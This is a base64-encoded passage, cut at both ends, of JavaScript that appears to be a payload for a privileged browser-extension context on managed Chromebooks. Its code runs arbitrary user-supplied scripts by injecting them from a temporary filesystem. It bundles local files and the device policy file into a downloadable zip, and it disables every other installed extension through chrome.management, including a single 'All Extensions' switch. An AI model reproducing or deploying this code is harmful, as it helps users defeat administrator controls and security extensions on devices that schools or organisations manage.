m9tZS50YWJzLmdldEN1cnJlbnQoZnVuY3Rpb24odGFiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS53aW5kb3dzLnVwZGF0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYi53aW5kb3dJZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvY3VzZWQ6IHRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMudXBkYXRlKHRhYi5pZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3RpdmU6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGl6LmRpc2FybSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXoucHJldmlld2luZyA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5hcHBlbmRDaGlsZChwcmV2aWV3QnV0dG9uKTsKICAgICAgICAgICAgICAgICAgICAgICAgdGFibGlzdC5hcHBlbmRDaGlsZChkaXYpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIHRoaXoudGFiTGlzdEluUHJvZ3Jlc3MgPSBmYWxzZTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKICAgIH0KICAgIGFjdGl2YXRlKCkgewogICAgICAgIGRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKAogICAgICAgICAgICAiYmVmb3JlZW5kIiwKICAgICAgICAgICAgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy50ZW1wbGF0ZQogICAgICAgICk7CgogICAgICAgIGRvY3VtZW50LmJvZHkKICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNleHRfZGVmYXVsdCIpCiAgICAgICAgICAgIC5xdWVyeVNlbGVjdG9yQWxsKCJidXR0b24iKQogICAgICAgICAgICAuZm9yRWFjaChmdW5jdGlvbihidG4pIHsKCiAgICAgICAgICAgICAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCB0aGlzLm9uQnRuQ2xpY2tfLmJpbmQodGhpcywgYnRuKSk7CiAgICAgICAgICAgIH0sIHRoaXMpOwogICAgICAgIGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2ZvcnJlZW5yb2xsIikKICAgICAgICAgICAgLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgYXN5bmMgZnVuY3Rpb24gaGFuZGxlcl8odGFyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyghKCdKU1ppcCcgaW4gd2luZG93KSk7CiAgICAgICAgICAgICAgICBpZiAoISgnSlNaaXAnIGluIHdpbmRvdykpIHsKICAgICAgICAgICAgICAgICAgICBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmV2YWxDb2RlKGF3YWl0IChhd2FpdCBmZXRjaCgiaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvanN6aXAvMy4xMC4xL2pzemlwLm1pbi5qcyIpKS50ZXh0KCkpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoaGFuZGxlcl8pOwogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJjcmVhdGluZyB6aXAiKTsKICAgICAgICAgICAgICAgIGNvbnN0IHppcEZpbGUgPSBuZXcgSlNaaXAoKTsKICAgICAgICAgICAgICAgIGZvciAoY29uc3QgZiBvZiBrRmlsZXMpIHsKICAgICAgICAgICAgICAgICAgICBsZXQgYnVmZmVyOwogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGJ1ZmZlciA9IGF3YWl0IHJlYWRGaWxlKGYpOwogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coImNvdWxkIG5vdCByZWFkIGZpbGUgIiArIGYpOwogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgemlwRmlsZS5maWxlKHBvc2l4LmJhc2VuYW1lKGYpLCBuZXcgVWludDhBcnJheShidWZmZXIpKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHppcEZpbGUuZmlsZShwb3NpeC5iYXNlbmFtZShhd2FpdCBmaW5kTGFzdFBvbGljeUZpbGUoKSksIGF3YWl0IHJlYWRGaWxlKGF3YWl0IGZpbmRMYXN0UG9saWN5RmlsZSgpKSk7CiAgICAgICAgICAgICAgICBjb25zdCB1cmwgPSBVUkwuY3JlYXRlT2JqZWN0VVJMKGF3YWl0IHppcEZpbGUuZ2VuZXJhdGVBc3luYyh7CiAgICAgICAgICAgICAgICAgICAgdHlwZTogImJsb2IiCiAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgICAgICBjb25zdCBhZWxlbSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsKICAgICAgICAgICAgICAgIGFlbGVtLmhyZWYgPSB1cmw7CiAgICAgICAgICAgICAgICBhZWxlbS5kb3dubG9hZCA9ICIiOwogICAgICAgICAgICAgICAgYWVsZW0uY2xpY2soKTsKICAgICAgICAgICAgfSkKCiAgICAgICAgdGhpcy51cGRhdGVUYWJMaXN0KCk7CiAgICAgICAgZm9yIChsZXQgaSBpbiBjaHJvbWUudGFicykgewogICAgICAgICAgICBpZiAoaS5zdGFydHNXaXRoKCJvbiIpKSB7CiAgICAgICAgICAgICAgICBjaHJvbWUudGFic1tpXS5hZGRMaXN0ZW5lcigoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgdGhpcy51cGRhdGVUYWJMaXN0KCk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICB9CiAgICBzdGF0aWMgZ2V0RlMoKSB7CiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGZ1bmN0aW9uKHJlc29sdmUpIHsKICAgICAgICAgICAgd2Via2l0UmVxdWVzdEZpbGVTeXN0ZW0oVEVNUE9SQVJZLCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogICAgICAgIH0pOwogICAgfQogICAgc3RhdGljIGFzeW5jIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsKICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgZW50cnkucmVtb3ZlKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbih3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci5vbndyaXRlZW5kID0gcmVzb2x2ZS5iaW5kKG51bGwsIGVudHJ5LnRvVVJMKCkpOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKICAgIH0KICAgIHN0YXRpYyBhc3luYyBldmFsQ29kZShjb2RlKSB7CiAgICAgICAgY29uc3QgdXJsID0gYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy53cml0ZUZpbGUoInNyYy5qcyIsIGNvZGUpOwogICAgICAgIGxldCBzY3JpcHQgPQogICAgICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNldmFsdWF0ZV9lbGVtIikgPz8KICAgICAgICAgICAgZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LnJlbW92ZSgpOwogICAgICAgIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5pZCA9ICJldmFsdWF0ZV9lbGVtIjsKICAgICAgICBzY3JpcHQuc3JjID0gdXJsOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKICAgIH0KCiAgICBhc3luYyBvbkJ0bkNsaWNrXyhiKSB7CiAgICAgICAgc3dpdGNoIChiLmlkKSB7CiAgICAgICAgICAgIGNhc2UgImNvZGVfZXZhbHVhdGUiOiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiRXZhbHVhdGluZyBjb2RlISIpOwogICAgICAgICAgICAgICAgY29uc3QgeCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlX2lucHV0IikudmFsdWU7CiAgICAgICAgICAgICAgICBjb25zdCBmcyA9IGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMuZ2V0RlMoKTsKICAgICAgICAgICAgICAgIERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMuZXZhbENvZGUoeCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2FzZSAidGFicmVsb2FkIjogewogICAgICAgICAgICAgICAgdGhpcy51cGRhdGVUYWJMaXN0KCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KY2xhc3MgSG9zdFBlcm1pc3Npb25zIHsKICAgIGFjdGl2YXRlKCkge30KfQoKZnVuY3Rpb24gY3JlYXRlRXh0ZW5zaW9uQ2FyZChuYW1lLCBpZCwgZW5hYmxlZCwgaWNvbl91cmwpIHsKICAgIGNvbnN0IGxpID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGkiKTsKICAgIGxpLmNsYXNzTmFtZSA9ICJleHRlbnNpb24tY2FyZCI7CiAgICBsaS5pbm5lckhUTUwgPSBgCiAgICAgIDxpbWcgY2xhc3M9ImV4dGVuc2lvbi1pY29uIiBzcmM9IiR7aWNvbl91cmx9Ii8+CiAgICAgIDxzcGFuIGNsYXNzPSJleHRlbnNpb24tbmFtZSI+JHtuYW1lfSA8bGl0c3R1ZmY+ICR7aWR9PC9saXRzdHVmZj48L3NwYW4+CiAgICAgIDxsYWJlbCBjbGFzcz0idG9nZ2xlLXN3aXRjaCI+CiAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giICR7ZW5hYmxlZCA/ICJjaGVja2VkIiA6ICIifT4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJzbGlkZXIiPjwvc3Bhbj4KICAgICAgPC9sYWJlbD4KICBgOwogICAgcmV0dXJuIGxpOwp9CgpmdW5jdGlvbiBjcmVhdGVFeHRlbnNpb25DYXJkQWxsKGVuYWJsZWQgPSB0cnVlKSB7CiAgICBjb25zdCBsaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7CiAgICBsaS5jbGFzc05hbWUgPSAiZXh0ZW5zaW9uLWNhcmQtYWxsIjsKICAgIGxpLmlubmVySFRNTCA9IGAKICAgICAgPGltZyBjbGFzcz0iZXh0ZW5zaW9uLWljb24iIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvVDNNMU40TC9yZWZzL2hlYWRzL21haW4vaW1hZ2VzL1hPc1guZ2lmIi8+CiAgICAgIDxzcGFuIGNsYXNzPSJleHRlbnNpb24tbmFtZSI+QWxsIEV4dGVuc2lvbnM8L3NwYW4+CiAgICAgIDxsYWJlbCBjbGFzcz0idG9nZ2xlLXN3aXRjaCI+CiAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giICR7ZW5hYmxlZCA/ICJjaGVja2VkIiA6ICIifT4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJzbGlkZXIiPjwvc3Bhbj4KICAgICAgPC9sYWJlbD4KICBgOwogICAgcmV0dXJuIGxpOwp9CgpmdW5jdGlvbiB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KSB7CiAgICByZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24ocmVzb2x2ZSwgcmVqZWN0KSB7CiAgICAgICAgZXh0bGlzdF9lbGVtZW50LmlubmVySFRNTCA9ICIiOwogICAgICAgIGxldCBjYXJkQWxsID0gY3JlYXRlRXh0ZW5zaW9uQ2FyZEFsbCgpOwogICAgICAgIGxldCBjYXJkSW5wdXRBbGwgPSBjYXJkQWxsLnF1ZXJ5U2VsZWN0b3IoImlucHV0Iik7CgogICAgICAgIGNhcmRJbnB1dEFsbC5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCAoZXZlbnQpID0+IHsKICAgICAgICAgICAgY2FyZElucHV0QWxsLmRpc2FibGVkID0gdHJ1ZTsKICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0U2VsZihmdW5jdGlvbihzZWxmKSB7CiAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24oZXh0ZW5zaW9ucykgewogICAgICAgICAgICAgICAgICAgIGlmIChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRXJyb3IgbG9hZGluZyBleHRlbnNpb25zOiAiICsgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlamVjdChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJvbWlzZXMgPSBbXTsKICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGV4dGVuc2lvbnMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGV4dElkID0gZXh0ZW5zaW9uc1tpXS5pZDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGV4dElkICE9PSBzZWxmLmlkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9taXNlcy5wdXNoKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoZXh0SWQsIGV2ZW50LnRhcmdldC5jaGVja2VkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBQcm9taXNlLmFsbChwcm9taXNlcykKICAgICAgICAgICAgICAgICAgICAgICAgLnRoZW4oKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FyZElucHV0QWxsLmRpc2FibGVkID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgIC5jYXRjaCgoZXJyb3IpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFsZXJ0KCJFcnJvciBlbmFibGluZy9kaXNhYmxpbmcgZXh0ZW5zaW9uczogIiArIGVycm9yLm1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVqZWN0KGVycm9yKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CgogICAgICAgIGV4dGxpc3RfZWxlbWVudC5hcHBlbmRDaGlsZChjYXJkQWxsKTsKCiAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0QWxsKGZ1bmN0aW9uKGV4dGxpc3QpIHsKICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgYWxlcnQoIkVycm9yIGxvYWRpbmcgZXh0ZW5zaW9uczogIiArIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvci5tZXNzYWdlKTsKICAgICAgICAgICAgICAgIHJldHVybiByZWplY3QoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgY29uc3Qgb3JkbGlzdCA9IFtdOwogICAgICAgICAgICBleHRsaXN0LmZvckVhY2goZnVuY3Rpb24oZXh0ZW5zaW9uKSB7CiAgICAgICAgICAgICAgICBpZiAoZXh0ZW5zaW9uLmlkID09PSBuZXcgVVJMKG5ldyBVUkwobG9jYXRpb24uaHJlZikub3JpZ2luKS5ob3N0KSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3JkbGlzdC5wdXNoKGV4dGVuc2lvbik7CgogICAgICAgICAgICAgICAgY29uc3QgaWNvbiA9CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmljb25zPy5maW5kKChpYykgPT4gaWMuc2l6ZSA9PT0gMTI4KSA/PwogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5pY29ucz8uYXQoLTEpOwoKICAgICAgICAgICAgICAgIGxldCBjYXJkID0gY3JlYXRlRXh0ZW5zaW9uQ2FyZCgKICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24ubmFtZSwKICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWQsCiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmVuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgaWNvbj8udXJsIHx8CiAgICAgICAgICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML1QzTTFONEwvcmVmcy9oZWFkcy9tYWluL2ltYWdlcy9YT3NYLmdpZiIKICAgICAgICAgICAgICAgICk7CgogICAgICAgICAgICAgICAgbGV0IGNhcmRJbnB1dCA9IGNhcmQucXVlcnlTZWxlY3RvcigiaW5wdXQiKTsKCiAgICAgICAgICAgICAgICBjYXJkSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgKGV2ZW50KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZCgKICAgICAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmlkLAogICAgICAgICAgICAgICAgICAgICAgICBldmVudC50YXJnZXQuY2hlY2tlZCwKICAgICAgICAgICAgICAgICAgICAgICAgKHJlc3VsdCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFsZXJ0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRXJyb3IgdXBkYXRpbmcgZXh0ZW5zaW9uIHN0YXR1czogIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvci5tZXNzYWdlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBjYXJkLnF1ZXJ5U2VsZWN0b3IoIi5leHRlbnNpb24taWNvbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gewogICAgICAgICAgICAgICAgICAgIHVzZXJkZWZJZHMgPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpOwogICAgICAgICAgICAgICAgICAgIGlmICh1c2VyZGVmSWRzLmluY2x1ZGVzKGV4dGVuc2lvbi5pZCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcy5yZW1vdmUoZXh0ZW5zaW9uLmlkKTsKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oInVzZXJkZWZJZHMiLCBKU09OLnN0cmluZ2lmeSh1c2VyZGVmSWRzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIG1ha2VUb2FzdCgicmVtb3ZlZCAiICsgZXh0ZW5zaW9uLnNob3J0TmFtZSArICIgZnJvbSB0aGUgbGlzdCIsIDIpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJkZWZJZHMucHVzaChleHRlbnNpb24uaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgidXNlcmRlZklkcyIsIEpTT04uc3RyaW5naWZ5KHVzZXJkZWZJZHMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KCJhZGRlZCAiICsgZXh0ZW5zaW9uLnNob3J0TmFtZSArICIgdG8gdGhlIGxpc3QiLCAyKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcmRlZklkcyIpID09PSBKU09OLnN0cmluZ2lmeShbXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5xdWVyeVNlbGVjdG9yKCIjZGlzYWJsZS11c2VyZGVmLWV4dHMiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLnNldEF0dHJpYnV0ZSgic3R5bGUiLCAiZGlzcGxheTogbm9uZTsiKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBpbmxpbmU7Iik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgZXh0bGlzdF9lbGVtZW50LmFwcGVuZENoaWxkKGNhcmQpOwogICAgICAgICAgICB9KTsKICAgICAgICAgICAgc2F2ZWRFeHRMaXN0ID0gb3JkbGlzdDsKICAgICAgICAgICAgcmVzb2x2ZSgpOwogICAgICAgIH0pOwogICAgfSk7Cn0KCmNvbnN0IGZpbGVNYW5hZ2VyUHJpdmF0ZVRlbXBsYXRlID0gYAogIDxkaXYgaWQ9ImZpbGVNYW5hZ2VyUHJpdmF0ZV9jYXAiPgogICAgPGRpdiBpZD0iRk1QX29wZW5VUkwiPgogICAgICA8YnV0dG9uIGlkPSJidG5fRk1QX29wZW5VUkwiPk9wZW4gVVJMIGluIFNraW92b3ggd2luZG93PC9idXR0b24+CiAgICA8L2Rpdj4KICA8L2Rpdj4KCmA7CmNvbnN0IGh0bWxTdHlsZSA9IGAKICAgIDxzdHlsZT4KICAgIEBpbXBvcnQgdXJsKCdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUdlaXN0Oml0YWwsb3Bzeix3Z2h0QDAsMTQuLjMyLDEwMC4uOTAwOzEsMTQuLjMyLDEwMC4uOTAwJmRpc3BsYXk9c3dhcCcpOwogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOwogICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICB9CiAgICAuYmFja2dyb3VuZC1ncmlkIHsKICAgICAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICAgICAgdG9wOiAwOwogICAgICAgIGxlZnQ6IDA7CiAgICAgICAgcmlnaHQ6IDA7CiAgICAgICAgYm90dG9tOiAwOwogICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHJhZGlhbC1ncmFkaWVudCgjMzMzIDFweCwgdHJhbnNwYXJlbnQgMXB4KTsKICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IDJyZW0gMnJlbTsKICAgICAgICB6LWluZGV4OiAtMTsKICAgICAgICBhbmltYXRpb246IG1vdmVHcmlkIDRzIGxpbmVhciBpbmZpbml0ZTsKICAgICAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLXBvc2l0aW9uLXggNDAwbXM7CiAgICAgIH0KCiAgICAgIEBrZXlmcmFtZXMgbW92ZUdyaWQgewogICAgICAgIDAlIHsKICAgICAgICAgIGJhY2tncm91bmQtcG9zaXRpb246IDAgMDsKICAgICAgICB9CgogICAgICAgIDEwMCUgewogICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMnJlbSAycmVtOwogICAgICAgIH0KICAgICAgfQoKICAgICAgLmJhY2tncm91bmQtZ3JpZDpob3ZlciB7CiAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbi14OiAycmVtOwogICAgICB9CiAgICAgIGJvZHk6Oi13ZWJraXQtc2Nyb2xsYmFyLCBkaWFsb2c6Oi13ZWJraXQtc2Nyb2xsYmFyLCBkaWFsb2cgZGl2Ojotd2Via2l0LXNjcm9sbGJhciB7CiAgICAgICAgZGlzcGxheTogbm9uZTsKICAgICAgfQogICAgICBwIHsKICAgICAgICBtYXJnaW46IDVweCBhdXRvOwogICAgICB9CiAgICAgICNjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCwgI2V4dF9kZWZhdWx0IHsKICAgICAgICAgbWF4LXdpZHRoOiAxMjAwcHg7CiAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICB9CiAgICAgIGgxIHsKICAgICAgICBmb250LXNpemU6IDI0cHg7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgfQogICAgICAuZGVzY3JpcHRpb24gewogICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7CiAgICAgICAgY29sb3I6ICMzMzM7CiAgICAgIH0KICAgICAgLmV4dGVuc2lvbi1kaXNhYmxlciB7CiAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMGEwYTBhOwogICAgICAgIHBhZGRpbmc6IDE1cHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7CiAgICAgIH0KICAgICAgdWwgewogICAgICAgIGxpc3Qtc3R5bGUtdHlwZTogbm9uZTsKICAgICAgICBwYWRkaW5nOiAwOwogICAgICAgIHBhZGRpbmctYm90dG9tOiA1MHB4OwogICAgICB9Ci5leHRlbnNpb24tY2FyZCB7CiAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICBtYXJnaW4tYm90dG9tOiAxMHB4OwogIHBhZGRpbmc6IDE1cHg7CiAgYm9yZGVyLXJhZGl1czogOHB4OwogIGRpc3BsYXk6IGZsZXg7CiAganVzdGlmeS1jb250ZW50OiBzdGFydDsKICBhbGlnbi1pdGVtczogY2VudGVyOwogIGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7CiAgdH